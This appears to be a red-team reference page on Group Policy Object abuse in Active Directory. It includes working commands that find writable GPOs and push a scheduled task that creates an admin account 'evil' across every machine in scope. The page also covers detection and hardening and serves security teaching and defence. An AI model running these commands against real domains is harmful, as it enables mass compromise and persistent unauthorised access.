---
title: "GPO abuse"
category: "red-team"
tags: ["active-directory", "gpo", "privesc", "lateral-movement"]
platform: "windows"
mitre: ["T1484.001"]
difficulty: "advanced"
updated: "2026-07-13"
author: "core"
---

# GPO abuse

## TL;DR
Group Policy Objects push configuration and scripts to many machines/users. If you can edit a GPO (or its linked container), you can execute code, add local admins, or create scheduled tasks across every computer it applies to — mass compromise from a single ACL. Find write access via BloodHound (`GenericWrite`/`WriteDacl` on GPOs, or write on an OU it's linked to).

## Finding it
```bash
# BloodHound edges: GenericWrite/GenericAll/WriteDacl/WriteOwner on a GPO,
# or write access to an OU (link a malicious GPO).
# PowerView
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "Write" }
```

## Abuse (mass code exec)
```powershell
# SharpGPOAbuse / pyGPOAbuse – inject an immediate scheduled task / add local admin
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author corp\admin \
  --Command "cmd.exe" --Arguments "/c net user evil P@ss /add & net localgroup administrators evil /add" \
  --GPOName "Default Domain Policy"
```
```bash
# From Linux
pygpoabuse.py corp.local/user:'Pass' -gpo-id <GUID> -command "net localgroup administrators evil /add"
```
```text
Effect: on the next policy refresh, EVERY machine in scope runs your payload
(add admin / scheduled task / logon script). Scope = whatever the GPO is linked to.
```

## Impact scale
```text
- Link/write on "Default Domain Policy" or a Domain Controllers GPO = domain-wide / DC compromise.
- A single misconfigured ACL on one GPO can equal mass RCE.
```

## Detection (Blue Team)
```text
- GPO changes: Event 5136/5137 (directory modifications) on GPO objects / gPCFileSysPath;
  changes to SYSVOL GPO files (scheduled tasks, scripts).
- New immediate scheduled tasks arriving via GPO; local admin additions across many hosts.
- Correlate GPO edits with the editing account (should be tightly controlled).
```

## Mitigation / Hardening
- Tightly restrict who can edit GPOs and link them (audit with BloodHound); tiering.
- Monitor GPO/SYSVOL changes (5136, FIM on SYSVOL); alert on new tasks/scripts in GPOs.
- Least privilege on OUs; protect Tier 0 GPOs (DCs, Default Domain Policy).
- Related: [bloodhound](./bloodhound.md), [scheduled-task-abuse](../persistence/scheduled-task-abuse.md).

## Sources
- [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) · [MITRE T1484.001](https://attack.mitre.org/techniques/T1484/001/)
